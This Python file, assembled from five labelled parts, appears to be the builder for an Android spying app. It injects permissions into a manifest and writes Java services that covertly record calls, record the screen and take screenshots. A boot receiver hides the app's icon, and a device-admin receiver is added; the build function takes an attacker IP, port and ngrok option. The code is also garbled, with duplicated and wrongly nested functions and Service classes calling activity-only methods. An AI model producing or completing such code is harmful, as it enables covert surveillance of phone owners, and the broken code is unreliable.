# Part 1: Start of utils.py

import os
import socket

def clearDirec():
    # Implement directory clearing logic here
    pass

def stdOutput(type):
    # Return appropriate message format based on the type
    return "[%s]" % type.upper()

def build(ip, port, output, use_ngrok, ngrok_port, icon):
    # Example build function to modify the APK
    # You can add logic here to modify the APK, such as injecting new features

    # Add new features
    add_permissions()
    add_services_and_receivers_to_manifest()
    create_call_recording_service()
    create_screen_recording_service()
    create_screenshot_service()
    create_hide_apk_receiver()
    create_device_admin_receiver()

    # Existing build logic
    print(f"Building APK with IP: {ip}, Port: {port}, Output: {output}, Use Ngrok: {use_ngrok}, Icon: {icon}")

# Part 1: End of utils.py

# Part 2: Start of utils.py

def add_permissions():
    permissions = [
        '<uses-permission android:name="android.permission.READ_PHONE_STATE"/>',
        '<uses-permission android:name="android.permission.RECORD_AUDIO"/>',
        '<uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>',
        '<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>',
        '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>',
        '<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>',
        '<uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>',
        '<uses-permission android:name="android.permission.CAPTURE_AUDIO_OUTPUT"/>',
        '<uses-permission android:name="android.permission.CAPTURE_VIDEO_OUTPUT"/>',
        '<uses-permission android:name="android.permission.INTERNET"/>',
        '<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>'
    ]
    manifest_path = "path/to/AndroidManifest.xml"
    with open(manifest_path, 'a') as manifest_file:
        for permission in permissions:
            manifest_file.write(f"{permission}\n")

def add_services_and_receivers_to_manifest():
    services_and_receivers = [
        '<service android:name=".CallRecordingService" android:permission="android.permission.BIND_JOB_SERVICE"/>',
        '<service android:name=".ScreenRecordingService" android:permission="android.permission.BIND_JOB_SERVICE"/>',
        '<service android:name=".ScreenshotService" android:permission="android.permission.BIND_JOB_SERVICE"/>',
        '<receiver android:name=".HideApkReceiver">',
        '   <intent-filter>',
        '       <action android:name="android.intent.action.BOOT_COMPLETED"/>',
        '   </intent-filter>',
        '</receiver>',
        '<receiver android:name=".MyDeviceAdminReceiver"',
        '    android:permission="android.permission.BIND_DEVICE_ADMIN">',
        '    <meta-data android:name="android.app.device_admin"',
        '        android:resource="@xml/device_admin_receiver" />',
        '    <intent-filter>',
        '        <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />',
        '    </intent-filter>',
        '</receiver>'
    ]
    manifest_path = "path/to/AndroidManifest.xml"
    with open(manifest_path, 'a') as manifest_file:
        for entry in services_and_receivers:
            manifest_file.write(f"{entry}\n")

# Part 2: End of utils.py

# Part 3: Start of utils.py

def create_call_recording_service():
    service_code = """
    package com.example.myapp;

    import android.app.Service;
    import android.content.Intent;
    import android.media.MediaRecorder;
    import android.os.IBinder;
    import android.util.Log;
    import java.io.IOException;

    public class CallRecordingService extends Service {
        private MediaRecorder recorder;
        private boolean isRecording = false;

        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            if (!isRecording) {
                startRecording();
            }
            return START_STICKY;
        }

        private void startRecording() {
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile("/sdcard/call_recording.3gp");

            try {
                recorder.prepare();
                recorder.start();
                isRecording = true;
            } catch (IOException e) {
                Log.e("CallRecordingService", "startRecording: ", e);
            }
        }

        @Override
        public void onDestroy() {
            super.onDestroy();
            if (recorder != null) {
                recorder.stop();
                recorder.release();
                recorder = null;
                isRecording = false;
            }
        }

        @Override
        public IBinder onBind(Intent intent) {
            return null;
        }
    }
    """
    service_path = "path/to/CallRecordingService.java"
    with open(service_path, 'w') as service_file:
        service_file.write(service_code)

# Part 3: End of utils.py

# Part 4: Start of utils.py
def create_screen_recording_service():
    service_code = """
    package com.example.myapp;

    import android.app.Service;
    import android.content.Intent;
    import android.media.projection.MediaProjection;
    import android.media.projection.MediaProjectionManager;
    import android.os.IBinder;
    import android.util.Log;

    public class ScreenRecordingService extends Service {
        private static final String TAG = "ScreenRecordingService";
        private MediaProjectionManager projectionManager;
        private MediaProjection mediaProjection;

        @Override
        public void onCreate() {
            super.onCreate();
            projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        }

        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            if (intent != null && intent.getAction().equals("START_RECORDING")) {
                startProjection();
            } else if (intent != null && intent.getAction().equals("STOP_RECORDING")) {
                stopProjection();
            }
            return START_STICKY;
        }

        private void startProjection() {
            Intent captureIntent = projectionManager.createScreenCaptureIntent();
            startActivityForResult(captureIntent, 1);
        }

        private void stopProjection() {
            if (mediaProjection != null) {
                mediaProjection.stop();
                mediaProjection = null;
            }
        }

        @Override
        public IBinder onBind(Intent intent) {
            return null;
        }
    }
    """
    service_path = "path/to/ScreenRecordingService.java"
    with open(service_path, 'w') as service_file:
        service_file.write(service_code)

    def create_screenshot_service():
        service_code = """
        package com.example.myapp;

        import android.app.Service;
        import android.content.Intent;
        import android.os.IBinder;
        import android.view.WindowManager;
        import android.graphics.PixelFormat;
        import android.view.Display;
        import android.hardware.display.DisplayManager;
        import android.view.Surface;
        import android.media.projection.MediaProjectionManager;
        import android.media.projection.MediaProjection;
        import android.media.ImageReader;
        import android.media.Image;
        import java.nio.ByteBuffer;
        import java.io.FileOutputStream;
        import java.io.IOException;
        import android.os.Environment;
        import android.util.DisplayMetrics;
        import android.graphics.Bitmap;

    public class ScreenshotService extends Service {
        private MediaProjectionManager projectionManager;
        private MediaProjection mediaProjection;
        private ImageReader imageReader;
        private int width;
        private int height;
        private int density;

        @Override
        public void onCreate() {
            super.onCreate();
            projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            DisplayMetrics metrics = new DisplayMetrics();
            WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
            windowManager.getDefaultDisplay().getMetrics(metrics);
            width = metrics.widthPixels;
            height = metrics.heightPixels;
            density = metrics.densityDpi;
            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 1);
        }

        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            startProjection();
            return START_STICKY;
        }

        private void startProjection() {
            Intent captureIntent = projectionManager.createScreenCaptureIntent();
            startActivityForResult(captureIntent, 1);
        }

        @Override
        public void onActivityResult(int requestCode, int resultCode, Intent data) {
            if (requestCode == 1) {
                mediaProjection = projectionManager.getMediaProjection(resultCode, data);
                mediaProjection.createVirtualDisplay("ScreenCapture", width, height, density,
                        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
                imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                    @Override
                    public void onImageAvailable(ImageReader reader) {
                        Image image = reader.acquireLatestImage();
                        if (image != null) {
                            Image.Plane[] planes = image.getPlanes();
                            ByteBuffer buffer = planes[0].getBuffer();
                            int pixelStride = planes[0].getPixelStride();
                            int rowStride = planes[0].getRowStride();
                            int rowPadding = rowStride - pixelStride * width;

                            Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
                            bitmap.copyPixelsFromBuffer(buffer);
                            saveBitmap(bitmap);
                            image.close();
                        }
                    }
                }, null);
            }
        }

        private void saveBitmap(Bitmap bitmap) {
            String filePath = Environment.getExternalStorageDirectory() + "/screenshot.png";
            try (FileOutputStream fos = new FileOutputStream(filePath)) {
                bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        @Override
        public IBinder onBind(Intent intent) {
            return null;
        }
    }
    """
    service_path = "path/to/ScreenshotService.java"
    with open(service_path, 'w') as service_file:
        service_file.write(service_code)


# Part 4: End of utils.py

# Part 5: Start of utils.py

def create_screen_recording_service():
    service_code = """
    package com.example.myapp;

    import android.app.Service;
    import android.content.Intent;
    import android.media.projection.MediaProjection;
    import android.media.projection.MediaProjectionManager;
    import android.os.IBinder;
    import android.util.Log;

    public class ScreenRecordingService extends Service {
        private static final String TAG = "ScreenRecordingService";
        private MediaProjectionManager projectionManager;
        private MediaProjection mediaProjection;

        @Override
        public void onCreate() {
            super.onCreate();
            projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
        }

        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            if (intent != null && intent.getAction().equals("START_RECORDING")) {
                startProjection();
            } else if (intent != null && intent.getAction().equals("STOP_RECORDING")) {
                stopProjection();
            }
            return START_STICKY;
        }

        private void startProjection() {
            Intent captureIntent = projectionManager.createScreenCaptureIntent();
            startActivityForResult(captureIntent, 1);
        }

        private void stopProjection() {
            if (mediaProjection != null) {
                mediaProjection.stop();
                mediaProjection = null;
            }
        }

        private void saveBitmap(Bitmap bitmap) {
            File file = new File(Environment.getExternalStorageDirectory(), "screenshot.png");
            FileOutputStream fos = null;
            try {
                fos = new FileOutputStream(file);
                bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
                fos.flush();
            } catch (IOException e) {
                e.printStackTrace();
            } finally {
                if (fos != null) {
                    try {
                        fos.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }
        }

        @Override
        public void onDestroy() {
            super.onDestroy();
            if (mediaProjection != null) {
                mediaProjection.stop();
                mediaProjection = null;
            }
        }

        @Override
        public IBinder onBind(Intent intent) {
            return null;
        }
    }
    """
    service_path = "path/to/ScreenRecordingService.java"
    with open(service_path, 'w') as service_file:
        service_file.write(service_code)

def create_screenshot_service():
    service_code = """
    package com.example.myapp;

    import android.app.Service;
    import android.content.Intent;
    import android.os.IBinder;
    import android.view.WindowManager;
    import android.graphics.PixelFormat;
    import android.view.Display;
    import android.hardware.display.DisplayManager;
    import android.view.Surface;
    import android.media.projection.MediaProjectionManager;
    import android.media.projection.MediaProjection;
    import android.media.ImageReader;
    import android.media.Image;
    import java.nio.ByteBuffer;
    import java.io.FileOutputStream;
    import java.io.IOException;
    import android.os.Environment;
    import android.util.DisplayMetrics;
    import android.graphics.Bitmap;

    public class ScreenshotService extends Service {
        private MediaProjectionManager projectionManager;
        private MediaProjection mediaProjection;
        private ImageReader imageReader;
        private int width;
        private int height;
        private int density;

        @Override
        public void onCreate() {
            super.onCreate();
            projectionManager = (MediaProjectionManager) getSystemService(MEDIA_PROJECTION_SERVICE);
            DisplayMetrics metrics = new DisplayMetrics();
            WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
            windowManager.getDefaultDisplay().getMetrics(metrics);
            width = metrics.widthPixels;
            height = metrics.heightPixels;
            density = metrics.densityDpi;
            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 1);
        }

        @Override
        public int onStartCommand(Intent intent, int flags, int startId) {
            startProjection();
            return START_STICKY;
        }

        private void startProjection() {
            Intent captureIntent = projectionManager.createScreenCaptureIntent();
            startActivityForResult(captureIntent, 1);
        }

        @Override
        public void onActivityResult(int requestCode, int resultCode, Intent data) {
            if (requestCode == 1) {
                mediaProjection = projectionManager.getMediaProjection(resultCode, data);
                mediaProjection.createVirtualDisplay("ScreenCapture", width, height, density,
                        DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, imageReader.getSurface(), null, null);
                imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                    @Override
                    public void onImageAvailable(ImageReader reader) {
                        Image image = reader.acquireLatestImage();
                        if (image != null) {
                            Image.Plane[] planes = image.getPlanes();
                            ByteBuffer buffer = planes[0].getBuffer();
                            int pixelStride = planes[0].getPixelStride();
                            int rowStride = planes[0].getRowStride();
                            int rowPadding = rowStride - pixelStride * width;

                            Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
                            bitmap.copyPixelsFromBuffer(buffer);
                            saveBitmap(bitmap);
                            image.close();
                        }
                    }
                }, null);
            }
        }

        private void saveBitmap(Bitmap bitmap) {
            String filePath = Environment.getExternalStorageDirectory() + "/screenshot.png";
            try (FileOutputStream fos = new FileOutputStream(filePath)) {
                bitmap.compress(Bitmap.CompressFormat.PNG, 100, fos);
            } catch (IOException e) {
                e.printStackTrace();
            }
        }

        @Override
        public void onDestroy() {
            super.onDestroy();
            if (mediaProjection != null) {
                mediaProjection.stop();
                mediaProjection = null;
            }
        }

        @Override
        public IBinder onBind(Intent intent) {
            return null;
        }
    }
    """
    service_path = "path/to/ScreenshotService.java"
    with open(service_path, 'w') as service_file:
        service_file.write(service_code)

def create_hide_apk_receiver():
    receiver_code = """
    package com.example.myapp;

    import android.content.BroadcastReceiver;
    import android.content.Context;
    import android.content.Intent;
    import android.content.pm.PackageManager;
    import android.content.ComponentName;

    public class HideApkReceiver extends BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
                PackageManager pm = context.getPackageManager();
                pm.setComponentEnabledSetting(new ComponentName(context, MainActivity.class),
                        PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
            }
        }
    }
    """
    receiver_path = "path/to/HideApkReceiver.java"
    with open(receiver_path, 'w') as receiver_file:
        receiver_file.write(receiver_code)

def create_device_admin_receiver():
    receiver_code = """
    package com.example.myapp;

    import android.app.admin.DeviceAdminReceiver;
    import android.content.Context;
    import android.content.Intent;

    public class MyDeviceAdminReceiver extends DeviceAdminReceiver {
        @Override
        public void onEnabled(Context context, Intent intent) {
            super.onEnabled(context, intent);
        }

        @Override
        public void onDisabled(Context context, Intent intent) {
            super.onDisabled(context, intent);
        }
    }
    """
    receiver_path = "path/to/MyDeviceAdminReceiver.java"
    with open(receiver_path, 'w') as receiver_file:
        receiver_file.write(receiver_code)



# Part 5: End of utils.py


